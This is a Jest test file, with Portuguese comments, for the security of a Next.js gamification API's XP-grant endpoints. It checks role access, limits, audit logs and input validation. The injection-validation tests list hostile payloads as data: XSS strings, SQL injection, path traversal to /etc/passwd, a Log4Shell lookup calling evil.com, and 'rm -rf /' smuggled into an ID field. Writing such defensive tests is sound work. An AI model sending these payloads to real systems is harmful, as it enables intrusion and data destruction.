/**
 * @jest-environment node
 */
import { NextRequest } from "next/server";
import { POST as postXpGrants, GET as getXpGrants } from "../xp-grants/route";
import { POST as postXpTypes, GET as getXpTypes } from "../xp-types/route";
import { GET as getStatistics } from "../xp-grants/statistics/route";
import { GET as getDailyStats } from "../xp-grants/daily-stats/route";
import { XpAvulsoService } from "@/services/xpAvulsoService";
import { AuthMiddleware, AuditLogger } from "@/lib/auth-middleware";
import { prisma } from "@/lib/prisma";

// Mock de todos os serviços
jest.mock("@/services/xpAvulsoService");
jest.mock("@/lib/auth-middleware");
jest.mock("@/lib/prisma");
jest.mock("@/lib/rate-limit");

const mockXpAvulsoService = XpAvulsoService as jest.Mocked<
  typeof XpAvulsoService
>;
const mockAuthMiddleware = AuthMiddleware as jest.Mocked<typeof AuthMiddleware>;
const mockAuditLogger = AuditLogger as jest.Mocked<typeof AuditLogger>;
const mockPrisma = prisma as jest.Mocked<typeof prisma>;

// Mock do rate limiter
jest.mock("@/lib/rate-limit", () => ({
  xpGrantRateLimiter: {
    checkLimit: jest.fn().mockResolvedValue({
      allowed: true,
      remaining: 9,
      resetTime: Date.now() + 60000,
    }),
  },
  xpAvulsoRateLimiter: {
    checkLimit: jest.fn().mockResolvedValue({
      allowed: true,
      remaining: 29,
      resetTime: Date.now() + 60000,
    }),
  },
}));

describe("XP Avulso - Testes Avançados de Segurança", () => {
  beforeEach(() => {
    jest.clearAllMocks();
    mockAuditLogger.logAdminAction.mockResolvedValue(undefined);
  });

  describe("Controle de Acesso Granular por Role", () => {
    describe("SUPERADMIN - Acesso Total", () => {
      beforeEach(() => {
        mockAuthMiddleware.checkAuth.mockResolvedValue({
          authorized: true,
          session: {
            user: {
              id: "superadmin-1",
              email: "superadmin@empresa.com",
              name: "Super Admin",
              role: "SUPERADMIN",
            },
          },
        });
      });

      it("deve permitir todas as operações para SUPERADMIN", async () => {
        // Mock dos serviços
        mockXpAvulsoService.findAllXpTypes.mockResolvedValue([]);
        mockXpAvulsoService.createXpType.mockResolvedValue({} as any);
        mockXpAvulsoService.grantXp.mockResolvedValue({} as any);
        mockXpAvulsoService.findGrantHistory.mockResolvedValue({
          grants: [],
          total: 0,
          page: 1,
          totalPages: 0,
        } as any);
        mockXpAvulsoService.getGrantStatistics.mockResolvedValue({} as any);
        mockPrisma.xpGrant.findMany.mockResolvedValue([]);

        const operations = [
          {
            name: "Listar tipos de XP",
            request: () =>
              getXpTypes(
                new NextRequest("http://localhost/api/gamification/xp-types"),
              ),
            expectedStatus: 200,
          },
          {
            name: "Criar tipo de XP",
            request: () =>
              postXpTypes(
                new NextRequest("http://localhost/api/gamification/xp-types", {
                  method: "POST",
                  body: JSON.stringify({
                    name: "Test",
                    description: "Test",
                    points: 50,
                  }),
                  headers: { "Content-Type": "application/json" },
                }),
              ),
            expectedStatus: 201,
          },
          {
            name: "Conceder XP",
            request: () =>
              postXpGrants(
                new NextRequest("http://localhost/api/gamification/xp-grants", {
                  method: "POST",
                  body: JSON.stringify({
                    attendantId: "att-1",
                    typeId: "type-1",
                  }),
                  headers: { "Content-Type": "application/json" },
                }),
              ),
            expectedStatus: 201,
          },
          {
            name: "Consultar histórico",
            request: () =>
              getXpGrants(
                new NextRequest("http://localhost/api/gamification/xp-grants"),
              ),
            expectedStatus: 200,
          },
          {
            name: "Ver estatísticas",
            request: () =>
              getStatistics(
                new NextRequest(
                  "http://localhost/api/gamification/xp-grants/statistics",
                ),
              ),
            expectedStatus: 200,
          },
          {
            name: "Ver estatísticas diárias",
            request: () =>
              getDailyStats(
                new NextRequest(
                  "http://localhost/api/gamification/xp-grants/daily-stats",
                ),
              ),
            expectedStatus: 200,
          },
        ];

        for (const operation of operations) {
          const response = await operation.request();
          expect(response.status).toBe(operation.expectedStatus);
        }
      });

      it("deve permitir acesso a dados sensíveis para SUPERADMIN", async () => {
        const sensitiveStatistics = {
          totalGrants: 1000,
          totalPoints: 50000,
          grantsByGranter: [
            {
              granterId: "admin-1",
              granterName: "Admin 1",
              count: 500,
              totalPoints: 25000,
            },
            {
              granterId: "admin-2",
              granterName: "Admin 2",
              count: 500,
              totalPoints: 25000,
            },
          ],
          suspiciousActivity: [
            {
              granterId: "admin-3",
              reason: "Muitas concessões em pouco tempo",
              count: 100,
            },
          ],
        };

        mockXpAvulsoService.getGrantStatistics.mockResolvedValue(
          sensitiveStatistics as any,
        );

        const request = new NextRequest(
          "http://localhost/api/gamification/xp-grants/statistics?includeSensitive=true",
        );
        const response = await getStatistics(request);
        const data = await response.json();

        expect(response.status).toBe(200);
        expect(data.data.grantsByGranter).toBeDefined();
        expect(data.data.suspiciousActivity).toBeDefined();
      });
    });

    describe("ADMIN - Acesso Operacional", () => {
      beforeEach(() => {
        mockAuthMiddleware.checkAuth.mockResolvedValue({
          authorized: true,
          session: {
            user: {
              id: "admin-1",
              email: "admin@empresa.com",
              name: "Admin User",
              role: "ADMIN",
            },
          },
        });
      });

      it("deve permitir operações operacionais para ADMIN", async () => {
        mockXpAvulsoService.findAllXpTypes.mockResolvedValue([]);
        mockXpAvulsoService.createXpType.mockResolvedValue({} as any);
        mockXpAvulsoService.grantXp.mockResolvedValue({} as any);
        mockXpAvulsoService.findGrantHistory.mockResolvedValue({
          grants: [],
          total: 0,
          page: 1,
          totalPages: 0,
        } as any);

        const allowedOperations = [
          {
            name: "Listar tipos de XP",
            request: () =>
              getXpTypes(
                new NextRequest("http://localhost/api/gamification/xp-types"),
              ),
          },
          {
            name: "Criar tipo de XP",
            request: () =>
              postXpTypes(
                new NextRequest("http://localhost/api/gamification/xp-types", {
                  method: "POST",
                  body: JSON.stringify({
                    name: "Test",
                    description: "Test",
                    points: 50,
                  }),
                  headers: { "Content-Type": "application/json" },
                }),
              ),
          },
          {
            name: "Conceder XP",
            request: () =>
              postXpGrants(
                new NextRequest("http://localhost/api/gamification/xp-grants", {
                  method: "POST",
                  body: JSON.stringify({
                    attendantId: "att-1",
                    typeId: "type-1",
                  }),
                  headers: { "Content-Type": "application/json" },
                }),
              ),
          },
          {
            name: "Consultar histórico próprio",
            request: () =>
              getXpGrants(
                new NextRequest(
                  "http://localhost/api/gamification/xp-grants?granterId=admin-1",
                ),
              ),
          },
        ];

        for (const operation of allowedOperations) {
          const response = await operation.request();
          expect(response.status).not.toBe(403);
        }
      });

      it("deve restringir acesso a dados sensíveis para ADMIN", async () => {
        // ADMIN não deve ver dados de outros administradores por padrão
        mockAuthMiddleware.checkAuth.mockResolvedValue({
          authorized: false,
          error: "Acesso negado a dados sensíveis",
          statusCode: 403,
        });

        const request = new NextRequest(
          "http://localhost/api/gamification/xp-grants/statistics?includeSensitive=true",
        );
        const response = await getStatistics(request);

        expect(response.status).toBe(403);
      });
    });

    describe("SUPERVISOR - Acesso Somente Leitura", () => {
      beforeEach(() => {
        mockAuthMiddleware.checkAuth.mockResolvedValue({
          authorized: true,
          session: {
            user: {
              id: "supervisor-1",
              email: "supervisor@empresa.com",
              name: "Supervisor User",
              role: "SUPERVISOR",
            },
          },
        });
      });

      it("deve permitir apenas operações de leitura para SUPERVISOR", async () => {
        mockXpAvulsoService.findAllXpTypes.mockResolvedValue([]);
        mockXpAvulsoService.findGrantHistory.mockResolvedValue({
          grants: [],
          total: 0,
          page: 1,
          totalPages: 0,
        } as any);
        mockXpAvulsoService.getGrantStatistics.mockResolvedValue({} as any);

        const allowedOperations = [
          {
            name: "Listar tipos de XP",
            request: () =>
              getXpTypes(
                new NextRequest("http://localhost/api/gamification/xp-types"),
              ),
            expectedStatus: 200,
          },
          {
            name: "Consultar histórico",
            request: () =>
              getXpGrants(
                new NextRequest("http://localhost/api/gamification/xp-grants"),
              ),
            expectedStatus: 200,
          },
          {
            name: "Ver estatísticas",
            request: () =>
              getStatistics(
                new NextRequest(
                  "http://localhost/api/gamification/xp-grants/statistics",
                ),
              ),
            expectedStatus: 200,
          },
        ];

        for (const operation of allowedOperations) {
          const response = await operation.request();
          expect(response.status).toBe(operation.expectedStatus);
        }
      });

      it("deve negar operações de escrita para SUPERVISOR", async () => {
        mockAuthMiddleware.checkAuth.mockResolvedValue({
          authorized: false,
          error: "Acesso negado. Permissão insuficiente.",
          statusCode: 403,
        });

        const deniedOperations = [
          {
            name: "Criar tipo de XP",
            request: () =>
              postXpTypes(
                new NextRequest("http://localhost/api/gamification/xp-types", {
                  method: "POST",
                  body: JSON.stringify({
                    name: "Test",
                    description: "Test",
                    points: 50,
                  }),
                }),
              ),
          },
          {
            name: "Conceder XP",
            request: () =>
              postXpGrants(
                new NextRequest("http://localhost/api/gamification/xp-grants", {
                  method: "POST",
                  body: JSON.stringify({
                    attendantId: "att-1",
                    typeId: "type-1",
                  }),
                }),
              ),
          },
        ];

        for (const operation of deniedOperations) {
          const response = await operation.request();
          expect(response.status).toBe(403);
        }
      });
    });

    describe("USUARIO - Acesso Negado", () => {
      beforeEach(() => {
        mockAuthMiddleware.checkAuth.mockResolvedValue({
          authorized: false,
          error: "Acesso negado. Permissão insuficiente.",
          statusCode: 403,
        });
      });

      it("deve negar todas as operações para USUARIO", async () => {
        const allOperations = [
          () =>
            getXpTypes(
              new NextRequest("http://localhost/api/gamification/xp-types"),
            ),
          () =>
            postXpTypes(
              new NextRequest("http://localhost/api/gamification/xp-types", {
                method: "POST",
              }),
            ),
          () =>
            getXpGrants(
              new NextRequest("http://localhost/api/gamification/xp-grants"),
            ),
          () =>
            postXpGrants(
              new NextRequest("http://localhost/api/gamification/xp-grants", {
                method: "POST",
              }),
            ),
          () =>
            getStatistics(
              new NextRequest(
                "http://localhost/api/gamification/xp-grants/statistics",
              ),
            ),
        ];

        for (const operation of allOperations) {
          const response = await operation();
          expect(response.status).toBe(403);
        }
      });
    });
  });

  describe("Testes de Limites de Concessão e Auditoria", () => {
    beforeEach(() => {
      mockAuthMiddleware.checkAuth.mockResolvedValue({
        authorized: true,
        session: {
          user: {
            id: "admin-1",
            email: "admin@empresa.com",
            name: "Admin Test",
            role: "ADMIN",
          },
        },
      });
    });

    it("deve aplicar limite diário de concessões por usuário", async () => {
      // Simular que o usuário já atingiu o limite diário
      mockXpAvulsoService.grantXp.mockRejectedValue(
        new Error("Limite diário de concessões atingido (50)"),
      );

      const request = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-1",
            typeId: "type-1",
            justification: "Tentativa após limite",
          }),
          headers: { "Content-Type": "application/json" },
        },
      );

      const response = await postXpGrants(request);
      const data = await response.json();

      expect(response.status).toBe(429);
      expect(data.error).toBe("Limite diário de concessões atingido (50)");

      // Verificar que a tentativa foi registrada para auditoria
      expect(mockAuditLogger.logAdminAction).toHaveBeenCalledWith(
        "admin-1",
        "GRANT_XP_FAILED",
        expect.objectContaining({
          reason: "Limite diário de concessões atingido (50)",
          attendantId: "att-1",
          typeId: "type-1",
        }),
      );
    });

    it("deve aplicar limite diário de pontos por usuário", async () => {
      // Simular que o usuário já atingiu o limite diário de pontos
      mockXpAvulsoService.grantXp.mockRejectedValue(
        new Error("Limite diário de pontos atingido (1000)"),
      );

      const request = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-1",
            typeId: "type-high-value", // Tipo com muitos pontos
            justification: "Tentativa de concessão alta",
          }),
          headers: { "Content-Type": "application/json" },
        },
      );

      const response = await postXpGrants(request);
      const data = await response.json();

      expect(response.status).toBe(429);
      expect(data.error).toBe("Limite diário de pontos atingido (1000)");
    });

    it("deve detectar padrões suspeitos de concessão", async () => {
      // Simular detecção de padrão suspeito
      mockXpAvulsoService.grantXp.mockRejectedValue(
        new Error(
          "Padrão suspeito detectado: muitas concessões para o mesmo atendente",
        ),
      );

      const request = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-suspicious",
            typeId: "type-1",
            justification: "Concessão repetitiva",
          }),
          headers: { "Content-Type": "application/json" },
        },
      );

      const response = await postXpGrants(request);
      const data = await response.json();

      expect(response.status).toBe(400);
      expect(data.error).toBe(
        "Padrão suspeito detectado: muitas concessões para o mesmo atendente",
      );

      // Verificar que o alerta foi registrado
      expect(mockAuditLogger.logAdminAction).toHaveBeenCalledWith(
        "admin-1",
        "SUSPICIOUS_ACTIVITY_DETECTED",
        expect.objectContaining({
          pattern: "muitas concessões para o mesmo atendente",
          attendantId: "att-suspicious",
        }),
      );
    });

    it("deve validar limites de concessão por atendente", async () => {
      // Simular limite por atendente atingido
      mockXpAvulsoService.grantXp.mockRejectedValue(
        new Error(
          "Atendente já recebeu o limite máximo de XP avulso hoje (300 pontos)",
        ),
      );

      const request = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-limit-reached",
            typeId: "type-1",
            justification: "Tentativa após limite do atendente",
          }),
          headers: { "Content-Type": "application/json" },
        },
      );

      const response = await postXpGrants(request);
      const data = await response.json();

      expect(response.status).toBe(429);
      expect(data.error).toBe(
        "Atendente já recebeu o limite máximo de XP avulso hoje (300 pontos)",
      );
    });
  });

  describe("Testes de Auditoria e Logs Detalhados", () => {
    beforeEach(() => {
      mockAuthMiddleware.checkAuth.mockResolvedValue({
        authorized: true,
        session: {
          user: {
            id: "admin-audit",
            email: "admin.audit@empresa.com",
            name: "Admin Auditoria",
            role: "ADMIN",
          },
        },
      });
    });

    it("deve registrar logs detalhados de todas as ações administrativas", async () => {
      // Teste de criação de tipo
      const mockCreatedType = {
        id: "type-audit-test",
        name: "Tipo Auditoria",
        description: "Tipo para teste de auditoria",
        points: 75,
        category: "teste",
        icon: "test",
        color: "#FF0000",
      };

      mockXpAvulsoService.createXpType.mockResolvedValue(
        mockCreatedType as any,
      );

      const createRequest = new NextRequest(
        "http://localhost/api/gamification/xp-types",
        {
          method: "POST",
          body: JSON.stringify({
            name: "Tipo Auditoria",
            description: "Tipo para teste de auditoria",
            points: 75,
            category: "teste",
            icon: "test",
            color: "#FF0000",
          }),
          headers: { "Content-Type": "application/json" },
        },
      );

      await postXpTypes(createRequest);

      expect(mockAuditLogger.logAdminAction).toHaveBeenCalledWith(
        "admin-audit",
        "CREATE_XP_TYPE",
        expect.objectContaining({
          typeName: "Tipo Auditoria",
          points: 75,
          category: "teste",
          icon: "test",
          color: "#FF0000",
          description: "Tipo para teste de auditoria",
        }),
      );

      // Teste de concessão de XP
      const mockGrant = {
        id: "grant-audit-test",
        attendantId: "att-audit",
        typeId: "type-audit-test",
        points: 75,
        justification: "Teste de auditoria completa",
        attendant: { id: "att-audit", name: "Atendente Auditoria" },
        type: mockCreatedType,
      };

      mockXpAvulsoService.grantXp.mockResolvedValue(mockGrant as any);
      mockXpAvulsoService.checkAchievementsUnlocked.mockResolvedValue([]);

      const grantRequest = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-audit",
            typeId: "type-audit-test",
            justification: "Teste de auditoria completa",
          }),
          headers: { "Content-Type": "application/json" },
        },
      );

      await postXpGrants(grantRequest);

      expect(mockAuditLogger.logAdminAction).toHaveBeenCalledWith(
        "admin-audit",
        "GRANT_XP",
        expect.objectContaining({
          attendantId: "att-audit",
          attendantName: "Atendente Auditoria",
          typeId: "type-audit-test",
          typeName: "Tipo Auditoria",
          points: 75,
          justification: "Teste de auditoria completa",
          achievementsUnlocked: 0,
        }),
      );
    });

    it("deve registrar tentativas de acesso negado", async () => {
      // Simular tentativa de acesso negado
      mockAuthMiddleware.checkAuth.mockResolvedValue({
        authorized: false,
        error: "Token expirado",
        statusCode: 401,
      });

      const request = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-1",
            typeId: "type-1",
          }),
          headers: {
            Authorization: "Bearer expired-token",
            "X-Forwarded-For": "192.168.1.100",
            "User-Agent": "Mozilla/5.0 (Test Browser)",
          },
        },
      );

      await postXpGrants(request);

      // Verificar que a tentativa foi registrada (o middleware deve fazer isso)
      expect(mockAuthMiddleware.checkAuth).toHaveBeenCalled();
    });

    it("deve registrar informações de contexto nas ações", async () => {
      const mockGrant = {
        id: "grant-context-test",
        attendantId: "att-context",
        typeId: "type-context",
        points: 100,
        justification: "Teste com contexto completo",
        attendant: { id: "att-context", name: "Atendente Contexto" },
        type: { id: "type-context", name: "Tipo Contexto", points: 100 },
      };

      mockXpAvulsoService.grantXp.mockResolvedValue(mockGrant as any);
      mockXpAvulsoService.checkAchievementsUnlocked.mockResolvedValue([]);

      const request = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-context",
            typeId: "type-context",
            justification: "Teste com contexto completo",
          }),
          headers: {
            "Content-Type": "application/json",
            "X-Forwarded-For": "10.0.0.50",
            "User-Agent": "Admin Dashboard v2.1",
            "X-Request-ID": "req-12345",
          },
        },
      );

      await postXpGrants(request);

      expect(mockAuditLogger.logAdminAction).toHaveBeenCalledWith(
        "admin-audit",
        "GRANT_XP",
        expect.objectContaining({
          attendantId: "att-context",
          typeId: "type-context",
          points: 100,
          justification: "Teste com contexto completo",
          metadata: expect.objectContaining({
            ipAddress: expect.any(String),
            userAgent: expect.any(String),
            requestId: expect.any(String),
          }),
        }),
      );
    });
  });

  describe("Testes de Validação de Dados Avançada", () => {
    beforeEach(() => {
      mockAuthMiddleware.checkAuth.mockResolvedValue({
        authorized: true,
        session: {
          user: {
            id: "admin-validation",
            email: "admin@empresa.com",
            name: "Admin Validation",
            role: "ADMIN",
          },
        },
      });
    });

    it("deve validar e sanitizar campos de texto contra XSS", async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        "${7*7}", // Template injection
        "{{7*7}}", // Template injection
        '<svg onload="alert(1)">',
        "data:text/html,<script>alert(1)</script>",
      ];

      for (const maliciousInput of maliciousInputs) {
        const request = new NextRequest(
          "http://localhost/api/gamification/xp-types",
          {
            method: "POST",
            body: JSON.stringify({
              name: maliciousInput,
              description: `Descrição com ${maliciousInput}`,
              points: 50,
            }),
            headers: { "Content-Type": "application/json" },
          },
        );

        const response = await postXpTypes(request);
        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe("Dados inválidos");
        expect(data.details).toContain(
          "Conteúdo potencialmente perigoso detectado",
        );
      }
    });

    it("deve validar limites de tamanho de campos", async () => {
      const oversizedInputs = [
        {
          field: "name",
          value: "A".repeat(256), // Nome muito longo
          expectedError: "Nome deve ter no máximo 255 caracteres",
        },
        {
          field: "description",
          value: "B".repeat(1001), // Descrição muito longa
          expectedError: "Descrição deve ter no máximo 1000 caracteres",
        },
        {
          field: "justification",
          value: "C".repeat(2001), // Justificativa muito longa
          expectedError: "Justificativa deve ter no máximo 2000 caracteres",
        },
      ];

      for (const input of oversizedInputs) {
        let request: NextRequest;

        if (input.field === "justification") {
          request = new NextRequest(
            "http://localhost/api/gamification/xp-grants",
            {
              method: "POST",
              body: JSON.stringify({
                attendantId: "att-1",
                typeId: "type-1",
                justification: input.value,
              }),
              headers: { "Content-Type": "application/json" },
            },
          );
        } else {
          const body: any = {
            name: input.field === "name" ? input.value : "Nome válido",
            description:
              input.field === "description" ? input.value : "Descrição válida",
            points: 50,
          };

          request = new NextRequest(
            "http://localhost/api/gamification/xp-types",
            {
              method: "POST",
              body: JSON.stringify(body),
              headers: { "Content-Type": "application/json" },
            },
          );
        }

        const response =
          input.field === "justification"
            ? await postXpGrants(request)
            : await postXpTypes(request);

        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe("Dados inválidos");
        expect(data.details).toContain(input.expectedError);
      }
    });

    it("deve validar tipos de dados e formatos", async () => {
      const invalidDataTypes = [
        {
          name: "Pontos como string",
          data: { name: "Test", description: "Test", points: "cinquenta" },
          expectedError: "Pontos deve ser um número",
        },
        {
          name: "Pontos negativos",
          data: { name: "Test", description: "Test", points: -10 },
          expectedError: "Pontos deve ser maior que 0",
        },
        {
          name: "Pontos zero",
          data: { name: "Test", description: "Test", points: 0 },
          expectedError: "Pontos deve ser maior que 0",
        },
        {
          name: "Cor inválida",
          data: {
            name: "Test",
            description: "Test",
            points: 50,
            color: "not-a-color",
          },
          expectedError: "Cor deve estar no formato hexadecimal",
        },
        {
          name: "Categoria inválida",
          data: {
            name: "Test",
            description: "Test",
            points: 50,
            category: "categoria_inexistente",
          },
          expectedError: "Categoria deve ser uma das opções válidas",
        },
      ];

      for (const testCase of invalidDataTypes) {
        const request = new NextRequest(
          "http://localhost/api/gamification/xp-types",
          {
            method: "POST",
            body: JSON.stringify(testCase.data),
            headers: { "Content-Type": "application/json" },
          },
        );

        const response = await postXpTypes(request);
        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe("Dados inválidos");
        expect(data.details).toContain(testCase.expectedError);
      }
    });

    it("deve validar IDs para prevenir ataques de injeção", async () => {
      const maliciousIds = [
        "'; DROP TABLE xp_grants; --",
        "../../../etc/passwd",
        "../../config/database.yml",
        "${jndi:ldap://evil.com/a}",
        "{{constructor.constructor('return process')().exit()}}",
        "<script>fetch('/admin/delete-all')</script>",
        "1 OR 1=1",
        "null; rm -rf /",
        "undefined",
        "NaN",
        "Infinity",
      ];

      for (const maliciousId of maliciousIds) {
        const request = new NextRequest(
          "http://localhost/api/gamification/xp-grants",
          {
            method: "POST",
            body: JSON.stringify({
              attendantId: maliciousId,
              typeId: "type-1",
              justification: "Teste de segurança",
            }),
            headers: { "Content-Type": "application/json" },
          },
        );

        const response = await postXpGrants(request);
        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe("Dados inválidos");
        expect(data.details).toContain("ID inválido detectado");
      }
    });
  });

  describe("Testes de Proteção contra Ataques Avançados", () => {
    beforeEach(() => {
      mockAuthMiddleware.checkAuth.mockResolvedValue({
        authorized: true,
        session: {
          user: {
            id: "admin-security",
            email: "admin@empresa.com",
            name: "Admin Security",
            role: "ADMIN",
          },
        },
      });
    });

    it("deve proteger contra ataques de timing", async () => {
      const startTime = Date.now();

      // Simular erro de validação que deve ter tempo de resposta consistente
      const request = new NextRequest(
        "http://localhost/api/gamification/xp-grants",
        {
          method: "POST",
          body: JSON.stringify({
            attendantId: "att-nonexistent",
            typeId: "type-nonexistent",
          }),
          headers: { "Content-Type": "application/json" },
        },
      );

      await postXpGrants(request);

      const endTime = Date.now();
      const responseTime = endTime - startTime;

      // Verificar que o tempo de resposta não é muito rápido (evita timing attacks)
      expect(responseTime).toBeGreaterThan(50); // Mínimo de 50ms
      expect(responseTime).toBeLessThan(5000); // Máximo de 5s
    });

    it("deve proteger contra ataques de enumeração de usuários", async () => {
      // Simular tentativas de descobrir IDs válidos
      const testIds = [
        "att-1",
        "att-2",
        "att-999",
        "att-nonexistent",
        "user-1",
        "admin-1",
        "invalid-id",
      ];

      const responseTimes: number[] = [];

      for (const testId of testIds) {
        const startTime = Date.now();

        const request = new NextRequest(
          "http://localhost/api/gamification/xp-grants",
          {
            method: "POST",
            body: JSON.stringify({
              attendantId: testId,
              typeId: "type-1",
            }),
            headers: { "Content-Type": "application/json" },
          },
        );

        await postXpGrants(request);

        const endTime = Date.now();
        responseTimes.push(endTime - startTime);
      }

      // Verificar que os tempos de resposta são consistentes (não revelam informações)
      const avgTime =
        responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
      const maxDeviation = Math.max(
        ...responseTimes.map((t) => Math.abs(t - avgTime)),
      );

      // Desvio máximo não deve ser muito grande (evita vazamento de informações)
      expect(maxDeviation).toBeLessThan(avgTime * 0.5);
    });

    it("deve proteger contra ataques de força bruta distribuída", async () => {
      const { xpGrantRateLimiter } = require("@/lib/rate-limit");

      // Simular tentativas de diferentes IPs
      const ips = [
        "192.168.1.1",
        "192.168.1.2",
        "192.168.1.3",
        "10.0.0.1",
        "10.0.0.2",
      ];

      for (let i = 0; i < ips.length; i++) {
        // Simular rate limiting progressivo
        xpGrantRateLimiter.checkLimit.mockResolvedValueOnce({
          allowed: i < 2, // Permitir apenas as 2 primeiras tentativas
          remaining: Math.max(0, 1 - i),
          resetTime: Date.now() + 60000,
        });

        const request = new NextRequest(
          "http://localhost/api/gamification/xp-grants",
          {
            method: "POST",
            body: JSON.stringify({
              attendantId: "att-target",
              typeId: "type-1",
            }),
            headers: {
              "Content-Type": "application/json",
              "X-Forwarded-For": ips[i],
            },
          },
        );

        const response = await postXpGrants(request);

        if (i >= 2) {
          expect(response.status).toBe(429);
        }
      }
    });

    it("deve detectar e bloquear tentativas de bypass de autenticação", async () => {
      const bypassAttempts = [
        { header: "X-Original-User", value: "admin" },
        { header: "X-Forwarded-User", value: "superadmin" },
        { header: "X-Remote-User", value: "system" },
        { header: "Authorization", value: "Bearer fake-admin-token" },
        { header: "X-API-Key", value: "master-key-123" },
      ];

      for (const attempt of bypassAttempts) {
        // Mock de detecção de tentativa de bypass
        mockAuthMiddleware.checkAuth.mockResolvedValue({
          authorized: false,
          error: "Tentativa de bypass de autenticação detectada",
          statusCode: 403,
        });

        const request = new NextRequest(
          "http://localhost/api/gamification/xp-grants",
          {
            method: "POST",
            body: JSON.stringify({
              attendantId: "att-1",
              typeId: "type-1",
            }),
            headers: {
              "Content-Type": "application/json",
              [attempt.header]: attempt.value,
            },
          },
        );

        const response = await postXpGrants(request);
        const data = await response.json();

        expect(response.status).toBe(403);
        expect(data.error).toBe(
          "Tentativa de bypass de autenticação detectada",
        );
      }
    });
  });
});
